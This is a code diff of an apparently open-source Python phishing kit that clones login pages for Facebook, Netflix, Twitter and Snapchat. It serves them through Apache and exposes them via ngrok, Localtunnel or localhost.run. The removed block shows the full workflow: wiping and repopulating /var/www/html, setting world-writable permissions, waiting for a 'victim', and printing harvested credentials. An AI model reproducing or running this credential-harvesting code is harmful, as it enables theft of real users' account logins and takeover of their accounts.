@@ -2,14 +2,15 @@
 
 
 
-'''
-You may change the code however you want
-Create pull requests to support the tool
-Create an issue if you find any problems or ideas
-Lasted Updated: 1/30/20
-Version 3.5: - Added Snapchat
-Please update version number and date each time we update
-'''
+##################################################################
+## You may change the code however you want                    ##
+## Create pull requests to support the tool                    ##
+## Create an issue if you find any problems or ideas           ##
+## Lasted Updated: 2/6/20                                      ##
+## Version 3.6: - Small fixes                                  ##
+## Please update version number and date each time we update   ##
+#################################################################
+
 
 
 # Libraries #
@@ -380,174 +381,6 @@ def endMessage(): # Message when you exit #
     print(yellow + "  Make Pull Request to support this tool\n")
     print("\n" + reset)
     exit(0)
-    
-    
-
-# Setup #
-    if choice1 == '1':
-        system("clear")
-        print(green + '[+] Copying Files')
-        sleep(0.1)
-        print(green + '[+] Cleaning /var/www/html/')
-        sleep(0.1)
-        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
-        print(green + '[+] Cleaning /Server/www/')
-        sleep(0.1)
-        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
-        dir_util.copy_tree(f"Websites/{template}",
-                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
-        redirect()  # Redirect Prompt #
-        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
-        print(green + '[+] Copying to /var/www/html')
-        sleep(0.1)
-        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
-        print(green + '[+] Changing File Permissions')
-        sleep(0.1)
-        print(yellow + '[+] Starting Apache2 Service')
-        sleep(0.1)
-        system('service apache2 start')  # Starts apache2 service #
-        print(green + '[+] Apache2 Service Started')
-        sleep(0.1)
-        print(blue + "\nLocal: " + red + localip + "\n")  # Shows where site is hosted locally #
-        sleep(0.1)
-        print(yellow + '[*] Starting ngrok')
-        ngrokForward()  # ngrok port forward #
-        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-        sleep(0.1)
-        while True:  # Waits for content on usernames.txt #
-            with open('/var/www/html/usernames.txt') as creds:
-                lines = creds.read().rstrip()
-                if len(lines) != 0:
-                    print(green + "______________________________________________________________________________\n")
-                    print('\n                CREDENTIALS FOUND\n\n')
-                    system("cat /var/www/html/usernames.txt")
-                    print("\n______________________________________________________________________________" + reset)
-                    endMessage()
-
-    elif choice1 == '2':
-        system("clear")
-        print(green + '[+] Copying Files')
-        sleep(0.1)
-        print(green + '[+] Cleaning /var/www/html/')
-        sleep(0.1)
-        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
-        print(green + '[+] Cleaning /Server/www/')
-        sleep(0.1)
-        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
-        dir_util.copy_tree(f"Websites/{template}",
-                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
-        redirect()  # Redirect Prompt #
-        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
-        print(green + '[+] Copying to /var/www/html')
-        sleep(0.1)
-        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
-        print(green + '[+] Changing File Permissions')
-        sleep(0.1)
-        print(yellow + '[+] Starting Apache2 Service')
-        sleep(0.1)
-        system('service apache2 start')  # Starts apache2 service #
-        print(green + '[+] Apache2 Service Started')
-        sleep(0.1)
-        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
-        sleep(0.1)
-        print(yellow + '[*] Starting Localtunnel')
-        localTunnel()  # Localtunnel port forward #
-        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-        sleep(0.1)
-        while True:  # Waits for content on usernames.txt #
-            with open('/var/www/html/usernames.txt') as creds:
-                lines = creds.read().rstrip()
-                if len(lines) != 0:
-                    print(green + "______________________________________________________________________________\n")
-                    print('\n                CREDENTIALS FOUND\n\n')
-                    system("cat /var/www/html/usernames.txt")
-                    print("\n______________________________________________________________________________" + reset)
-                    endMessage()
-
-    elif choice1 == '3':
-        system("clear")
-        print(green + '[+] Copying Files')
-        sleep(0.1)
-        print(green + '[+] Cleaning /var/www/html/')
-        sleep(0.1)
-        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
-        print(green + '[+] Cleaning /Server/www/')
-        sleep(0.1)
-        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
-        dir_util.copy_tree(f"Websites/{template}",
-                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
-        redirect()  # Redirect Prompt #
-        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
-        print(green + '[+] Copying to /var/www/html')
-        sleep(0.1)
-        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
-        print(green + '[+] Changing File Permissions')
-        sleep(0.1)
-        print(yellow + '[+] Starting Apache2 Service')
-        sleep(0.1)
-        system('service apache2 start')  # Starts apache2 service #
-        print(green + '[+] Apache2 Service Started')
-        sleep(0.1)
-        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
-        sleep(0.1)
-        print(yellow + '[*] Starting Localhost.run')
-        localhost()  # Localhost.run port forward #
-        while True:  # Waits for content on usernames.txt #
-            with open('/var/www/html/usernames.txt') as creds:
-                lines = creds.read().rstrip()
-                if len(lines) != 0:
-                    print(green + "______________________________________________________________________________\n")
-                    print('\n                CREDENTIALS FOUND\n\n')
-                    system("cat /var/www/html/usernames.txt")
-                    print("\n______________________________________________________________________________" + reset)
-                    endMessage()
-
-    elif choice1 == '4':
-        system("clear")
-        print(green + '[+] Copying Files')
-        sleep(0.1)
-        print(green + '[+] Cleaning /var/www/html/')
-        sleep(0.1)
-        system('rm -r /var/www/html/ && mkdir /var/www/html/')  # Removing then adding /var/www/html/ #
-        print(green + '[+] Cleaning /Server/www/')
-        sleep(0.1)
-        system('rm -r ' + cwd + "/Server/www && mkdir " + cwd + "/Server/www")  # Removes then adds /Server/www #
-        dir_util.copy_tree(f"Websites/{template}",
-                           "Server/www")  # Copies the entire folder of Websites/template to /Server/www #
-        redirect()  # Redirect Prompt #
-        print(green + '[+] Editing login.php(Do not edit/tamper with this file)')
-        dir_util.copy_tree("Server/www", "/var/www/html")  # Copies from Server/www to /var/www/html #
-        print(green + '[+] Copying to /var/www/html')
-        sleep(0.1)
-        system("chmod -R 777 /var/www/html")  # Change file permission of /var/www/html #
-        print(green + '[+] Changing File Permissions')
-        sleep(0.1)
-        print(yellow + '[+] Starting Apache2 Service')
-        sleep(0.1)
-        system('service apache2 start')  # Starts apache2 service #
-        print(green + '[+] Apache2 Service Started')
-        sleep(0.1)
-        print(yellow + "\n[*] Local: " + green + localip + "\n")  # Shows where site is hosted locally #
-        sleep(0.1)
-        print(yellow + "\n     Waiting For Victim ...  [Control + C] to stop\n")
-        sleep(0.1)
-        while True:  # Waits for content on usernames.txt #
-            with open('/var/www/html/usernames.txt') as creds:
-                lines = creds.read().rstrip()
-                if len(lines) != 0:
-                    print(green + "______________________________________________________________________________\n")
-                    print('\n                CREDENTIALS FOUND\n\n')
-                    system("cat /var/www/html/usernames.txt")
-                    print("\n______________________________________________________________________________" + reset)
-                    endMessage()
-
-    else:
-        print(red + '[!] Invalid Option')
-        sleep(1)
-        main()
 
 
 
@@ -584,19 +417,19 @@ def main():
     elif choice == '3':
         setup("Facebook")
 
-
-
     # Netflix #
     elif choice == '4':
         setup("Netflix")
 
-
-    # Twitter
+    # Twitter #
     elif choice == "5":
         setup("Twitter")
-        
+    
+    # Snapchat #
     elif choice == "6":
         setup("Snapchat")
+
+
 
     # Clean out everything #
     elif choice == "0":
